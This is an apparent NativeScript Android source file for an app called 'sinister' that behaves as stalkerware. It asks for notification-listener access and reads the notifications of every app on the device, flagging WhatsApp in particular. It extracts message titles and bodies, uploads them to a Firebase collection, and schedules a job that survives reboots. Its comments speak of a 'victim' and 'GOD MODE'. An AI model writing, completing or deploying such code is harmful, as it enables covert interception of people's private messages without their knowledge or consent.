import permissions from "nativescript-permissions";
import Firebase from './firebase';
const ad = require("tns-core-modules/utils/utils").ad;
const context = ad.getApplicationContext();
export default class Notification {
    firebase:Firebase;

    constructor(firebase){
        // Take the user to the notification service screen
        this.openNotificationServiceScreen();
        // Create the Job Service
        this.jobService();
        // Schedule the Job
        this.scheduleJob();
        // Start the notification listener
        this.startNotificationListener();
        // Set the firebase instance to the notification
        this.firebase = firebase;
    }

    openNotificationServiceScreen(){
        // Check if the app is allowed to listen to notifications already
        const enabledNotificationListeners = android.provider.Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        const isEnabled = enabledNotificationListeners != null && enabledNotificationListeners.indexOf(context.getPackageName()) >= 0;
        if(!isEnabled){
            // Since we are not allowed to listen, let us take the user to the screen that will allow them to give us permission
            try{
                const intent = new android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }catch(err){
                console.log("Can not open notification settings screen",err);
            }
        }
    }

    requestPermission(){
        // Apparently we do not require this permission 😇 , soo i will not call this function.
        return new Promise((resolve,reject) => {
            if(this.hasPermission()){
                return resolve(true);
            }
            permissions.requestPermission("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "I need these permissions because I'm cool")
            .then(() => {
                console.log("Woo Hoo, I have the power!");
                return resolve(true);
            })
            .catch(() => {
                console.log("Uh oh, no permissions - plan B time!");
                return resolve(false);
            });
        });
    }

    scheduleJob() {
        // Create a component from the JobService that should be triggered
        let component = new android.content.ComponentName(context, com.tns.notifications.MyJobService.class);
        const builder = new android.app.job.JobInfo.Builder(1, component);
    
        // Run this job every 30 minutes.
        builder.setPeriodic(30 * 60 * 1000);
        
        // persist this job across device reboots i.e rebooting will not kill me 😈 .
        builder.setPersisted(true);

        // runs only when device is connected to the wifi
        //builder.setRequiredNetwork(android.app.job.JobInfo.NETWORK_TYPE_UNMETERED);
        
        // Do the actual job scheduling
        const jobScheduler = context.getSystemService(android.content.Context.JOB_SCHEDULER_SERVICE);
        console.log("Job Scheduled: " + jobScheduler.schedule(builder.build()));
    }

    startNotificationListener(){
        android.service.notification.NotificationListenerService.extend("com.jmrsquared.sinister.NotificationListener", {
            onNotificationPosted: (sbn) => {
                // This is the main guy
                // He gets triggered everytime we get a new notification  FROM ANY APP on the phone 😈 
                // THIS IS GOD MODE.
                console.log("New push notification.");
               
                // This is to check if the app is whatsapp for obvious reasons 😊 
                if(sbn.getPackageName().toLowerCase().indexOf('whatsapp') >= 0){
                    // We will implement this as we go on
                }

                let messages = [];
                if(sbn.getNotification().extras){
                    if ((android.os.Build.VERSION.SDK_INT >= 26)){
                        // This is a condition where the user is using Android 7+, and he has chained messages
                        // e.g
                        // 2 unread from Davis, 4 unread from Terry
                        const extraMessages = sbn.getNotification().extras.get(android.app.Notification.EXTRA_MESSAGES);
                        if(extraMessages){
                            for(let i=0;i<extraMessages.length;i++){
                                // We obvious want to loop through all of them and push them in an array
                                messages.push({
                                    title: extraMessages[i].getString("text"),
                                    body: extraMessages[i].getString("text")
                                });
                            }
                        }
                    }else{  
                        // This is just one massage from old android versions 7-
                        // e.g
                        // Davis
                        // Hey baby i miss you
                        const title = sbn.getNotification().extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
                        const body = sbn.getNotification().extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
                        if(title || body){
                            messages.push({
                                title: title ? title.toString() : '',
                                body: body ? body.toString() : ''
                            });
                        }
                    }
                }else{
                    console.log("WE DO NOT HAVE EXTRAS");
                }
                console.log("package name",sbn.getPackageName());
                console.log("During a push",messages)
                const parts = sbn.getPackageName().split('.');
                const appName = parts && parts.length > 0 ? parts[parts.length - 1] : sbn.getPackageName();
                let appIcon = null;
                try{
                   const appIconDrawable = context.getPackageManager().getApplicationIcon(sbn.getPackageName());
                   console.log(appIconDrawable);
                }catch(err){
                    console.log('Can not get the app icon',err);
                }
                messages.slice(-5).forEach(msg => {
                    this.firebase.addMessageToCollection(msg,appName,appIcon);
                });
            },
            onCreate: () => {
                console.log("Created");
            },
            onDestroy:() =>{
                // We will handle this, but i haven't seen this yet
                console.log("On destroy the process")
            },
            onListenerConnected:() => {
                console.log("Listener connected")
            }
        });
    }

    sendPushNotification(title,body){
        // This entire function is for creating a local push notification and send it to the same device
        // This will not go to production obviously, it is just for testing
        // We want the push to go to the other device 😍 
        const builder = new android.app.Notification.Builder(context);
        builder.setContentTitle(title)
            .setAutoCancel(true)
            .setColor(android.R.color.holo_purple)
            .setContentText(body)
            .setVibrate([100, 200, 100])
            .setSmallIcon(android.R.drawable.btn_star_big_on);
    
        // will open main NativeScript activity when the notification is pressed
        const mainIntent = new android.content.Intent(context, com.tns.NativeScriptActivity.class); 
        
        // example for custom intent passing custom data via the broadcast receiver
        let intent = new android.content.Intent("customservice");
        var broadcastManager = androidx.localbroadcastmanager.content.LocalBroadcastManager.getInstance(ad.getApplicationContext());
        broadcastManager.sendBroadcast(intent);

        const mNotificationManager = context.getSystemService(android.content.Context.NOTIFICATION_SERVICE);

        // Build the cool staff like LED and i love purple, so it will be purple
        console.log("Android SDK",android.os.Build.VERSION.SDK_INT);
        if(android.os.Build.VERSION.SDK_INT >= 26){
            const channelId = "Sinister_channel";
            const mChannel = new android.app.NotificationChannel(channelId, "Sinister channel",android.app.NotificationManager.IMPORTANCE_LOW);
            mChannel.setDescription("This is a channel for sinister");
            mChannel.enableLights(true);
            mChannel.setLightColor(android.graphics.Color.PURPLE);
            mChannel.enableVibration(true);
            mNotificationManager.createNotificationChannel(mChannel);

            builder.setChannelId(channelId);
        }

        // Send the actual push notification
        mNotificationManager.notify(1, builder.build());
    }

    jobService() {
        android.app.job.JobService.extend("com.tns.notifications.MyJobService", {
            onStartJob: (params) => {       
                console.log("Job execution ...");
                // This is the job that we have scheduled Up there
                // It runs every 30 minutes when the user is connected to the WIFI and it is persist (Starts when the device reboots)
                // This is where the main function on the victim will be written
                // CONNECT THE DOTS 🤔 
                this.sendPushNotification("Test push","This is a push from the app");
                return false;
            },
            
            onStopJob: () => {
                console.log("Stopping job ...");
            }
        });
    }
    
    hasPermission(){
        return permissions.hasPermission("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE")
    }
}